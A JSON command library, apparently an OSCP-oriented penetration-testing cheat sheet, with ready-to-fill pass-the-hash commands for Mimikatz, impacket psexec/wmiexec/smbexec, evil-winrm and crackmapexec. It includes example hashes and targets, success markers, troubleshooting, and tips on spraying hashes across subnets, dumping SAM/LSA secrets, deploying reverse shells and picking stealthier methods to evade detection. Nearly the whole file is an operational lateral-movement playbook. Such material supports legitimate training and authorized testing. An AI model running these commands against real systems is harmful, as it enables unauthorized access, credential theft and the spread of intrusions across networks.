{
  "commands": [
    {
      "id": "pth-mimikatz-sekurlsa",
      "name": "Pass-the-Hash - Mimikatz sekurlsa::pth",
      "description": "Launch process with user's NTLM hash using Mimikatz from compromised Windows host",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex characters)",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "mimikatz",
        "lateral-movement",
        "active-directory",
        "windows",
        "ntlm",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-evil-winrm",
        "pth-cme-spray"
      ],
      "next_steps": [
        "Newly opened PowerShell runs in context of <USER>",
        "Use from that PowerShell to access resources as <USER>",
        "whoami shows current user, not impersonated user (expected)"
      ],
      "flag_explanations": {
        "/user": "Target username to impersonate",
        "/domain": "Domain name",
        "/ntlm": "NTLM hash (32 hex characters, no LM hash needed)",
        "/run": "Program to spawn with new context (powershell, cmd, etc.)",
        "privilege::debug": "Enable SeDebugPrivilege required for LSASS access"
      },
      "success_indicators": [
        "user : <USER>",
        "domain : <DOMAIN>",
        "NTLM : <HASH>",
        "process created - new PowerShell window opens"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_pth",
        "privilege::debug FAILED",
        "NTLM seems invalid"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "NTLM seems invalid": "Verify hash format: 32 hex characters only, no colons or spaces",
        "Process created but no access": "Hash may be invalid. Verify with: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "whoami shows wrong user": "Expected behavior - token shows original user, but network auth uses <USER>"
      },
      "notes": "EDUCATIONAL CONTEXT: Pass-the-Hash allows authentication without cracking password. WHY THIS WORKS: Windows NTLM authentication uses hash directly, not plaintext password. HOW IT WORKS: Mimikatz injects NTLM hash into LSASS process, new process inherits authentication token with hash. WHOAMI CONFUSION: whoami shows current user (doesn't check injected credentials), but network operations use <USER> hash. BEHIND THE SCENES: Creates new logon session (LUID), injects credentials, spawns process in that session. MANUAL TEST: From new PowerShell try 'dir \\\\<TARGET>\\C$' - should succeed as <USER>. TIME ESTIMATE: 2-3 minutes including hash verification. EXAM TIP: Always verify hash works before spending time on exploitation.",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-impacket-psexec",
      "name": "Pass-the-Hash - Impacket PSExec",
      "description": "Authenticate to remote Windows using NTLM hash with impacket-psexec from Kali",
      "command": "impacket-psexec -hashes :<NTLM_HASH> <USER>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username (local administrator or domain user)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex characters)",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "impacket",
        "psexec",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-wmiexec",
        "pth-impacket-smbexec",
        "pth-evil-winrm"
      ],
      "next_steps": [
        "Execute commands as SYSTEM",
        "Dump additional credentials",
        "Lateral movement to other systems"
      ],
      "flag_explanations": {
        "-hashes :NTLM": "Pass NTLM hash (colon prefix, no LM hash needed)",
        "-hashes LM:NTLM": "Pass both LM and NTLM (rarely needed)",
        "-target-ip": "Specify IP if hostname resolution fails",
        "-no-pass": "Don't prompt for password (hash auth only)"
      },
      "success_indicators": [
        "[*] Requesting shares on <TARGET>",
        "[*] Uploading file",
        "C:\\Windows\\system32>"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED",
        "Connection timeout"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid hash or username. Verify hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "STATUS_ACCESS_DENIED": "User not local admin. Test: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "UAC restriction": "Built-in local admin accounts blocked by UAC (except RID 500 Administrator)",
        "Connection timeout": "Firewall blocking SMB: sudo nmap -p 445 -Pn -v <TARGET>"
      },
      "notes": "EDUCATIONAL CONTEXT: Impacket PSExec with -hashes performs pass-the-hash from Kali to Windows. WHY THIS WORKS: NTLM protocol uses hash in challenge-response, never sending plaintext password. HASH FORMAT: Colon prefix required ':NTLM_HASH' (no LM hash unless old system). UAC LIMITATION: 2014 Microsoft patch blocks PTH for non-RID-500 local admins (domain users unaffected). OBTAINING HASHES: secretsdump.py, mimikatz, crackmapexec --sam, crackmapexec --lsa. BEHIND THE SCENES: Hash used in NTLM authentication handshake via SMB. TIME ESTIMATE: 1-2 minutes for connection. EXAM TIP: Test hash with crackmapexec before full PSExec to save time. ALTERNATIVE: If PSExec fails, try wmiexec or smbexec with same hash.",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-impacket-wmiexec",
      "name": "Pass-the-Hash - Impacket WMIExec",
      "description": "Semi-interactive shell via WMI using NTLM hash from Kali",
      "command": "impacket-wmiexec -hashes :<NTLM_HASH> <USER>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "impacket",
        "wmiexec",
        "wmi",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-impacket-smbexec"
      ],
      "next_steps": [
        "Execute commands via WMI",
        "More stealthy than PSExec (no service creation)",
        "Fileless execution"
      ],
      "flag_explanations": {
        "-hashes :NTLM": "NTLM hash for authentication",
        "-shell-type powershell": "Use PowerShell instead of cmd.exe",
        "-codec utf-8": "Set character encoding"
      },
      "success_indicators": [
        "[*] SMBv3.0 dialect used",
        "[!] Launching semi-interactive shell",
        "C:\\>"
      ],
      "failure_indicators": [
        "[-] SMB SessionError",
        "STATUS_LOGON_FAILURE",
        "RPC unavailable"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Verify hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "RPC unavailable": "Check port 135: sudo nmap -p 135 -Pn -v <TARGET>",
        "Slower than PSExec": "Expected - WMI creates temp share per command for output retrieval"
      },
      "notes": "EDUCATIONAL CONTEXT: WMIExec with hash provides fileless lateral movement alternative. WHY USE WMI: No service creation (stealthier than PSExec), no binary written to disk. COMPARISON: WMIExec slower than PSExec but more covert, better for evasion. HOW IT WORKS: Uses WMI Win32_Process.Create method, retrieves output via temp SMB share. TIME ESTIMATE: 2-3 minutes, slower command execution. EXAM TIP: Use when PSExec detected/blocked by security tools.",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-impacket-smbexec",
      "name": "Pass-the-Hash - Impacket SMBExec",
      "description": "Fileless shell via SMB using NTLM hash from Kali",
      "command": "impacket-smbexec -hashes :<NTLM_HASH> <USER>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "impacket",
        "smbexec",
        "lateral-movement",
        "active-directory",
        "kali",
        "fileless",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-impacket-wmiexec"
      ],
      "next_steps": [
        "Execute commands fileless",
        "No cleanup needed",
        "Stealthy lateral movement"
      ],
      "flag_explanations": {
        "-hashes :NTLM": "NTLM hash for authentication",
        "-mode SHARE": "Use ADMIN$ share (default)",
        "-mode SERVER": "Create temp SMB server for output"
      },
      "success_indicators": [
        "[!] Launching semi-interactive shell",
        "C:\\Windows\\system32>"
      ],
      "failure_indicators": [
        "STATUS_LOGON_FAILURE",
        "STATUS_OBJECT_NAME_NOT_FOUND"
      ],
      "troubleshooting": {
        "STATUS_OBJECT_NAME_NOT_FOUND": "ADMIN$ share not accessible",
        "Slower execution": "Expected - creates/deletes batch file per command"
      },
      "notes": "EDUCATIONAL CONTEXT: SMBExec provides fileless alternative to PSExec for maximum stealth. HOW IT WORKS: Creates temp batch file in ADMIN$ share, executes via service, deletes batch. FILELESS BENEFIT: No persistent binary on disk. TIME ESTIMATE: 2-4 minutes. EXAM TIP: Use when maximum stealth required.",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-evil-winrm",
      "name": "Pass-the-Hash - Evil-WinRM",
      "description": "Interactive PowerShell remoting via WinRM using NTLM hash from Kali",
      "command": "evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex characters, no colons)",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "evil-winrm",
        "winrm",
        "lateral-movement",
        "active-directory",
        "kali",
        "powershell",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-impacket-wmiexec"
      ],
      "next_steps": [
        "Interactive PowerShell shell",
        "Upload/download files",
        "Load PowerShell scripts"
      ],
      "flag_explanations": {
        "-i": "Target IP",
        "-u": "Username",
        "-H": "NTLM hash (uppercase H, no colon prefix)",
        "-S": "Use SSL (HTTPS port 5986)"
      },
      "success_indicators": [
        "*Evil-WinRM* PS C:\\Users\\",
        "Info: Establishing connection",
        "Interactive PowerShell prompt"
      ],
      "failure_indicators": [
        "Error: An error of type WinRM::WinRMAuthorizationError happened",
        "Network is unreachable",
        "SSL Handshake failed"
      ],
      "troubleshooting": {
        "Authorization error": "Verify hash: crackmapexec winrm <TARGET> -u <USER> -H <NTLM_HASH>",
        "Network unreachable": "Check WinRM port: nmap -p 5985,5986 -Pn -v <TARGET>",
        "Hash format error": "Use 32 hex characters, no colons: -H NTLM not -H :NTLM",
        "SSL error": "Try without SSL: remove -S flag"
      },
      "notes": "EDUCATIONAL CONTEXT: Evil-WinRM supports pass-the-hash for WinRM authentication from Kali. WHY USE THIS: Interactive PowerShell, file transfer built-in, cleaner interface than Impacket tools. HASH FORMAT: Unlike Impacket (uses :NTLM), Evil-WinRM uses bare hash (NTLM). REQUIREMENTS: Target must have WinRM enabled, user in Remote Management Users or Administrators. COMPARISON: More user-friendly than wmiexec, richer than psexec. TIME ESTIMATE: 1-2 minutes. EXAM TIP: Preferred for interactive post-exploitation via PTH. BEHIND THE SCENES: WinRM supports NTLM authentication, hash used in challenge-response.",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-cme-spray",
      "name": "Pass-the-Hash - CrackMapExec Spray",
      "description": "Spray NTLM hash across multiple targets to find where it works",
      "command": "crackmapexec smb <TARGET_RANGE> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET_RANGE>",
          "description": "Target IP, range, or CIDR",
          "example": "192.168.50.0/24",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "crackmapexec",
        "cme",
        "lateral-movement",
        "active-directory",
        "kali",
        "spraying",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec"
      ],
      "next_steps": [
        "Look for [+] Pwn3d! indicator (admin access)",
        "Use -x to execute commands on successful targets",
        "Use --sam to dump local SAM on pwned hosts"
      ],
      "flag_explanations": {
        "-u <USER>": "Username to test",
        "-H <NTLM_HASH>": "NTLM hash for authentication",
        "-x '<CMD>'": "Execute cmd.exe command on pwned hosts",
        "-X '<CMD>'": "Execute PowerShell command on pwned hosts",
        "--sam": "Dump SAM hashes on pwned hosts",
        "--lsa": "Dump LSA secrets on pwned hosts",
        "--local-auth": "Test local authentication instead of domain"
      },
      "success_indicators": [
        "[+] <TARGET> (Pwn3d!)",
        "STATUS_SUCCESS",
        "Administrator rights confirmed"
      ],
      "failure_indicators": [
        "[-] Authentication failed",
        "STATUS_LOGON_FAILURE",
        "[-] Connection error"
      ],
      "troubleshooting": {
        "Many failures expected": "Hash may only work on specific systems - look for Pwn3d!",
        "Timeout on subnet scan": "Reduce range or increase timeout: --timeout 5",
        "UAC blocking": "Local admin hashes blocked except RID 500 Administrator",
        "No Pwn3d found": "Try domain accounts or different hash"
      },
      "notes": "EDUCATIONAL CONTEXT: CrackMapExec efficiently tests hash across network to find where it grants admin access. WHY SPRAY: Same local admin password often reused across multiple machines. PWNED INDICATOR: [+] Pwn3d! means hash grants admin access on that host. UAC CAVEAT: Local admin hashes blocked by UAC on Windows 7+ (except built-in RID 500). EFFICIENT: Tests authentication only, no exploitation (fast). CIDR SUPPORT: 192.168.50.0/24 tests entire subnet. TIME ESTIMATE: 1-2 minutes for /24 subnet. EXAM TIP: After obtaining one hash, spray it to find all accessible systems. NEXT STEP: Use -x whoami or --sam on pwned hosts for further access.",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-cme-exec",
      "name": "Pass-the-Hash - CrackMapExec Execute",
      "description": "Execute commands on remote system using NTLM hash with CrackMapExec",
      "command": "crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH> -x '<COMMAND>'",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (cmd.exe syntax)",
          "example": "whoami",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "crackmapexec",
        "cme",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec"
      ],
      "next_steps": [
        "Execute enumeration commands",
        "Deploy reverse shell",
        "Dump credentials with --sam"
      ],
      "flag_explanations": {
        "-x '<CMD>'": "Execute cmd.exe command",
        "-X '<CMD>'": "Execute PowerShell command",
        "--exec-method": "Specify method: wmiexec (default), smbexec, atexec, mmcexec",
        "--no-output": "Don't retrieve command output (faster)"
      },
      "success_indicators": [
        "[+] Executing command",
        "[*] Executed command",
        "Command output displayed"
      ],
      "failure_indicators": [
        "[-] Authentication failed",
        "STATUS_ACCESS_DENIED"
      ],
      "troubleshooting": {
        "No output": "Try different --exec-method: wmiexec, smbexec, atexec",
        "Authentication failed": "Verify hash works: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "Command syntax error": "Use -x for cmd.exe, -X for PowerShell"
      },
      "notes": "EDUCATIONAL CONTEXT: CrackMapExec combines PTH authentication with command execution. WHY USE THIS: Quick one-liner for hash + command, supports multiple execution methods. EXECUTION METHODS: wmiexec (default, stealthy), smbexec (fileless), atexec (scheduled task), mmcexec (MMC). COMPARISON: Faster than full impacket-psexec for single commands. TIME ESTIMATE: <1 minute per command. EXAM TIP: Use for quick enumeration, then switch to full shell if needed.",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-verify-hash-format",
      "name": "Pass-the-Hash - Verify Hash Format",
      "description": "Test if NTLM hash is valid format and works for authentication before exploitation",
      "command": "crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash to test",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "verification",
        "crackmapexec",
        "enumeration",
        "active-directory",
        "kali"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "If Pwn3d!, proceed with pth-impacket-psexec",
        "If + but no Pwn3d, user authenticated but not admin",
        "If -, hash invalid or username wrong"
      ],
      "flag_explanations": {
        "-u <USER>": "Username to test",
        "-H <NTLM_HASH>": "NTLM hash (32 hex characters)",
        "--local-auth": "Test local authentication instead of domain"
      },
      "success_indicators": [
        "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)",
        "Administrator access confirmed"
      ],
      "failure_indicators": [
        "[-] <USER>:<NTLM_HASH> STATUS_LOGON_FAILURE",
        "Invalid hash format"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid hash or username. Verify hash extraction",
        "+ without Pwn3d": "User authenticated but not local admin",
        "Invalid hash format": "Ensure 32 hex characters, no spaces/colons/prefixes",
        "Hash from wrong user": "Match hash to username - secretsdump output shows user:hash pairs"
      },
      "notes": "EDUCATIONAL CONTEXT: Always verify hash before attempting lateral movement to save time. HASH FORMAT: 32 hexadecimal characters (128 bits). Example: 2892D26CDF84D7A70E2EB3B9F05C425E. COMMON FORMATS: Some tools show LM:NTLM (split by colon) - use only NTLM portion (second half). OBTAINING HASHES: secretsdump.py outputs as user:rid:lm:ntlm - use 4th field. PWNED MEANING: User is local administrator on target. TIME ESTIMATE: <10 seconds. EXAM TIP: Verify every hash before full exploitation attempt - saves time debugging failures.",
      "oscp_relevance": "medium"
    }
  ]
}